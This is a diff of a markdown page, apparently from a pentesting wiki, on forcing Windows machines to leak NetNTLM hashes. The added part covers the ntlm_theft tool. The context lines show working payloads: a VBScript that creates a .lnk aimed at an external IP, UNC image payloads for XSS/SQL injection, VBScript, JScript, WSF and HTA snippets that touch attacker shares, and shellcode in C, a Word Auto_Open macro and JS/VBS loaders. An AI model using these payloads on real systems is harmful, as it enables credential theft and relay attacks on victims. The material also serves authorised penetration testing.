@@ -1,10 +1,87 @@
 # Places to steal NTLM creds
 
-**All this POST was copied from:** [**https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/**](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)\*\*\*\*
+## Automatic Payloads Creation & Other lists
 
-## \*\*\*\*[Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
+### [ntlm\_theft](https://github.com/Greenwolf/ntlm_theft)
 
-One day me and @m3g9tr0n were discussing different places where we can use responder in stealing NetNTLM hashes. After experimenting I thought of writing this post along with some cool findings in the world of Windows. SMBRelay attacks are also possible in these scenarios.
+This tool will **create several documents/files** that if accessed by the user somehow they will **start a NTLM authentication with the attacker**.
+
+#### ntlm\_theft supports the following attack types:
+
+Browse to Folder Containing:
+
+* .url – via URL field
+* .url – via ICONFILE field
+* .lnk - via icon\_location field
+* .scf – via ICONFILE field \(Not Working on Latest Windows\)
+* autorun.inf via OPEN field \(Not Working on Latest Windows\)
+* desktop.ini - via IconResource field \(Not Working on Latest Windows\)
+
+Open Document:
+
+* .xml – via Microsoft Word external stylesheet
+* .xml – via Microsoft Word includepicture field
+* .htm – via Chrome & IE & Edge img src \(only if opened locally, not hosted\)
+* .docx – via Microsoft Word includepicture field
+
+  -.docx – via Microsoft Word external template
+
+  -.docx – via Microsoft Word frameset webSettings
+
+  -.xlsx - via Microsoft Excel external cell
+
+  -.wax - via Windows Media Player playlist \(Better, primary open\)
+
+  -.asx – via Windows Media Player playlist \(Better, primary open\)
+
+  -.m3u – via Windows Media Player playlist \(Worse, Win10 opens first in Groovy\)
+
+  -.jnlp – via Java external jar
+
+  -.application – via any Browser \(Must be served via a browser downloaded or won’t run\)
+
+Open Document and Accept Popup:
+
+* .pdf – via Adobe Acrobat Reader
+
+Click Link in Chat Program:
+
+* .txt – formatted link to paste into Zoom chat
+
+> Example :
+>
+> ```bash
+> # python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
+> Created: test/test.scf (BROWSE)
+> Created: test/test-(url).url (BROWSE)
+> Created: test/test-(icon).url (BROWSE)
+> Created: test/test.rtf (OPEN)
+> Created: test/test-(stylesheet).xml (OPEN)
+> Created: test/test-(fulldocx).xml (OPEN)
+> Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+> Created: test/test-(includepicture).docx (OPEN)
+> Created: test/test-(remotetemplate).docx (OPEN)
+> Created: test/test-(frameset).docx (OPEN)
+> Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+> Created: test/test.asx (OPEN)
+> Created: test/test.jnlp (OPEN)
+> Created: test/test.application (DOWNLOAD AND OPEN)
+> Created: test/test.pdf (OPEN AND ALLOW)
+> Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
+> Generation Complete.
+> ```
+
+### [All\_NTLM-Leak](https://github.com/Gl3bGl4z/All_NTLM_leak)
+
+> Cheatsheet
+
+This is a list of techniques to force NTLM authentications to steal credentials from the victim.
+
+### Force NTLM Privileged Authentication
+
+You may be able to **force a windows machine to authenticate to an arbitrary machine** using a privileged account. Read the following page to learn more:
+
+{% page-ref page="../active-directory-methodology/printers-spooler-service-abuse.md" %}
 
 ## LFI
 
@@ -31,9 +108,6 @@ In here I’m using “php://filter/convert.base64-encode/resource=” that will
   <password></password>
 </root>
 ```
-
-  
-
 
 ![](https://osandamalith.files.wordpress.com/2017/03/xxe.png?w=640)
 
@@ -95,8 +169,7 @@ find, findstr, [x]copy, move, replace, del, rename and many more!
 
 ## Auto-Complete
 
-You just need to type ‘\\host\’ the auto-complete will do the trick under the explorer and the run dialog box.  
-
+You just need to type ‘\host\’ the auto-complete will do the trick under the explorer and the run dialog box.
 
 ![](https://osandamalith.files.wordpress.com/2017/03/explorer.png?w=640)
 
@@ -154,9 +227,9 @@ We can create a shortcut containing our network path and as you as you open the 
 Set shl = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 currentFolder = shl.CurrentDirectory
- 
+
 Set sc = shl.CreateShortcut(fso.BuildPath(currentFolder, "\StealMyHashes.lnk"))
- 
+
 sc.TargetPath = "\\35.164.153.224\@OsandaMalith"
 sc.WindowStyle = 1
 sc.HotKey = "Ctrl+Alt+O"
@@ -217,27 +290,27 @@ Start-Process \\192.168.0.1\aa
 IE will resolve UNC paths. For example
 
 ```text
-<img src="\\\\192.168.0.1\\aa"> 
+<img src="\\\\192.168.0.1\\aa">
 ```
 
 You can inject under XSS or in scenarios you find SQL injection. For example.
 
 ```text
-http://host.tld/?id=-1' union select 1,'<img src="\\\\192.168.0.1\\aa">';%00 
+http://host.tld/?id=-1' union select 1,'<img src="\\\\192.168.0.1\\aa">';%00
 ```
 
 ## VBScript
 
 You can save this as .vbs or can be used inside a macro that is applied to Word or Excel files.
 
-```text
+```bash
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
 ```
 
 You can apply in web pages but this works only with IE.
 
-```text
+```markup
 <html>
 <script type="text/Vbscript">
 <!--
@@ -252,7 +325,6 @@ Here’ the encoded version. You can encode and save this as something.vbe
 
 ```text
 #@~^ZQAAAA==jY~6?}'ZM2mO2}4%+1YcEUmDb2YbxocorV?H/O+h6(LnmDE#=?nO,sksn{0dWcGa+U:+XYsbVcJJzf*cF*cF*2  yczmCE~8#XSAAAA==^#~@
-
 ```
 
 You can apply this in html files too. But only works with IE. You can save this as something.hta which will be an HTML Application under windows, which mshta.exe will execute it. By default it uses IE.
@@ -271,14 +343,14 @@ You can apply this in html files too. But only works with IE. You can save this 
 
 You can save this as something.js under windows.
 
-```text
+```javascript
 var fso = new ActiveXObject("Scripting.FileSystemObject")
 fso.FileExists("//192.168.0.103/aa")
 ```
 
 You can apply the same in html files but only works with IE. Also you can save this as something.hta.
 
-```text
+```markup
 <html>
 <script type="text/Jscript">
 <!--
@@ -297,7 +369,7 @@ Here’s the encoded version. You can save this as something.jse.
 
 The html version of this.
 
-```text
+```markup
 <html>
 <script type="text/Jscript.Encode">
 <!--
@@ -311,7 +383,7 @@ The html version of this.
 
 Save this as something.wsf.
 
-```text
+```markup
 <package>
   <job id="boom">
     <script language="VBScript">
@@ -337,9 +409,9 @@ Here’s a small shellcode I made. This shellcode uses CreateFile and tries to r
 # include <stdio.h>
 # include <string.h>
 # include <windows.h>
-  
+
 int main() {
- 
+
   char *shellcode = 
   "\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x4c\x03\x02\x02\x81\xf1\x02\x02"
   "\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x05\x0f\x44\xc6\xaa"
@@ -364,21 +436,21 @@ int main() {
   "\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04\x30\x03\xc6\xeb\xdf"
   "\x21\x05\x05\x05\x50\x05\x05\x05\x6b\x65\x72\x6e\x65\x6c\x33\x32"
   "\x2e\x64\x6c\x6c\x05\x2f\x2f\x65\x72\x72\x6f\x72\x2f\x61\x61\x05";
-     
+
   DWORD oldProtect;
-      
+
     wprintf(L"Length : %d bytes\n@OsandaMalith", strlen(shellcode));
     BOOL ret = VirtualProtect (shellcode, strlen(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);
-    
+
     if (!ret) {
         fprintf(stderr, "%s", "Error Occured");
         return EXIT_FAILURE;
     }
-    
+
     ((void(*)(void))shellcode)();
-   
+
     VirtualProtect (shellcode, strlen(shellcode), oldProtect, &oldProtect);
-    
+
     return EXIT_SUCCESS;
 }
 ```
@@ -397,7 +469,7 @@ Here’s the above shellcode applied inside a Word/Excel macro. You can use the 
 ' Website: https://osandamalith
 ' Shellcode : https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html
 ' This is a word/excel macro. This can be used in vb6 applications as well
- 
+
 #If Vba7 Then
     Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
         ByVal lpThreadAttributes As Long, _
@@ -406,19 +478,19 @@ Here’s the above shellcode applied inside a Word/Excel macro. You can use the 
         lpParameter As Long, _
         ByVal dwCreationFlags As Long, _ 
         lpThreadId As Long) As LongPtr
- 
- 
+
+
     Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
         ByVal lpAddress As Long, _
         ByVal dwSize As Long, _
         ByVal flAllocationType As Long, _
         ByVal flProtect As Long) As LongPtr 
- 
+
     Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
         ByVal Destination  As LongPtr, _
         ByRef Source As Any, _
         ByVal Length As Long) As LongPtr
- 
+
 #Else
     Private Declare Function CreateThread Lib "kernel32" ( _
         ByVal lpThreadAttributes As Long, _
@@ -427,22 +499,22 @@ Here’s the above shellcode applied inside a Word/Excel macro. You can use the 
         lpParameter As Long, _
         ByVal dwCreationFlags As Long, _
         lpThreadId As Long) As Long
- 
+
     Private Declare Function VirtualAlloc Lib "kernel32" ( _
         ByVal lpAddress As Long, _
         ByVal dwSize As Long, _
         ByVal flAllocationType As Long, _
         ByVal flProtect As Long) As Long
- 
+
     Private Declare Function RtlMoveMemory Lib "kernel32" ( _
         ByVal Destination As Long, _
         ByRef Source As Any, _
         ByVal Length As Long) As Long
 #EndIf
- 
+
 Const MEM_COMMIT = &H1000
 Const PAGE_EXECUTE_READWRITE = &H40
- 
+
 Sub Auto_Open()
     Dim source As Long, i As Long
 #If Vba7 Then
@@ -450,7 +522,7 @@ Sub Auto_Open()
 #Else
     Dim  lpMemory As Long, lResult As Long
 #EndIf
- 
+
     Dim bShellcode(376) As Byte
         bShellcode(0) = 232
         bShellcode(1) = 255
@@ -508,10 +580,10 @@ DX = new ActiveXObject("DynamicWrapperX");
 DX.Register("kernel32.dll", "VirtualAlloc", "i=luuu", "r=u");
 DX.Register("kernel32.dll","CreateThread","i=uullu","r=u" );
 DX.Register("kernel32.dll", "WaitForSingleObject", "i=uu", "r=u");
- 
+
 var MEM_COMMIT = 0x1000;
 var PAGE_EXECUTE_READWRITE = 0x40;
- 
+
 var sc = [
 0xe8, 0xff, 0xff, 0xff, 0xff, 0xc0, 0x5f, 0xb9, 0x55, 0x03, 0x02, 0x02, 0x81, 0xf1, 0x02, 0x02, 0x02, 0x02, 0x83, 0xc7,
 0x1d, 0x33, 0xf6, 0xfc, 0x8a, 0x07, 0x3c, 0x05, 0x0f, 0x44, 0xc6, 0xaa, 0xe2, 0xf6, 0xe8, 0x05, 0x05, 0x05, 0x05, 0x5e,
@@ -532,7 +604,7 @@ var sc = [
 0x0c, 0x30, 0x8b, 0x44, 0x33, 0x1c, 0x8d, 0x04, 0x88, 0x8b, 0x04, 0x30, 0x03, 0xc6, 0xeb, 0xdf, 0x21, 0x05, 0x05, 0x05,
 0x50, 0x05, 0x05, 0x05, 0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x05, 0x2f, 0x2f, 0x33,
 0x35, 0x2e, 0x31, 0x36, 0x34, 0x2e, 0x31, 0x35, 0x33, 0x2e, 0x32, 0x32, 0x34, 0x2f, 0x61, 0x61, 0x05];
- 
+
 var scLocation = DX.VirtualAlloc(0, sc.length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
 for(var i = 0; i < sc.length; i++) DX.NumPut(sc[i],scLocation,i);
 var thread = DX.CreateThread(0,0,scLocation,0,0);
@@ -548,15 +620,15 @@ var thread = DX.CreateThread(0,0,scLocation,0,0);
 ' Website: https://osandamalith.com
 ' Shellcode : https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html
 ' Based on subTee's JS: https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04
- 
+
 Set DX = CreateObject("DynamicWrapperX")
 DX.Register "kernel32.dll", "VirtualAlloc", "i=luuu", "r=u"
 DX.Register "kernel32.dll","CreateThread","i=uullu","r=u"
 DX.Register "kernel32.dll", "WaitForSingleObject", "i=uu", "r=u"
- 
+
 Const MEM_COMMIT = &H1000
 Const PAGE_EXECUTE_READWRITE = &H40
- 
+
 shellcode = Array( _
 &He8, &Hff, &Hff, &Hff, &Hff, &Hc0, &H5f, &Hb9, &H55, &H03, &H02, &H02, &H81, &Hf1, &H02, &H02, &H02, &H02, &H83, &Hc7, _
 &H1d, &H33, &Hf6, &Hfc, &H8a, &H07, &H3c, &H05, &H0f, &H44, &Hc6, &Haa, &He2, &Hf6, &He8, &H05, &H05, &H05, &H05, &H5e, _
@@ -577,13 +649,13 @@ shellcode = Array( _
 &H0c, &H30, &H8b, &H44, &H33, &H1c, &H8d, &H04, &H88, &H8b, &H04, &H30, &H03, &Hc6, &Heb, &Hdf, &H21, &H05, &H05, &H05, _
 &H50, &H05, &H05, &H05, &H6b, &H65, &H72, &H6e, &H65, &H6c, &H33, &H32, &H2e, &H64, &H6c, &H6c, &H05, &H2f, &H2f, &H33, _
 &H35, &H2e, &H31, &H36, &H34, &H2e, &H31, &H35, &H33, &H2e, &H32, &H32, &H34, &H2f, &H61, &H61, &H05)
- 
+
 scLocation = DX.VirtualAlloc(0, UBound(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
- 
+
 For i =LBound(shellcode) to UBound(shellcode)
     DX.NumPut shellcode(i),scLocation,i
 Next
- 
+
 thread = DX.CreateThread (0,0,scLocation,0,0)
 ```
 
@@ -591,7 +663,8 @@ thread = DX.CreateThread (0,0,scLocation,0,0)
 
 There might be many other ways in Windows. You never know! 🙂
 
-### References
+## References
 
-[https://attack.mitre.org/techniques/T1187/](https://attack.mitre.org/techniques/T1187/)
+* [**https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/**](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)\*\*\*\*
+* [https://attack.mitre.org/techniques/T1187/](https://attack.mitre.org/techniques/T1187/)
 
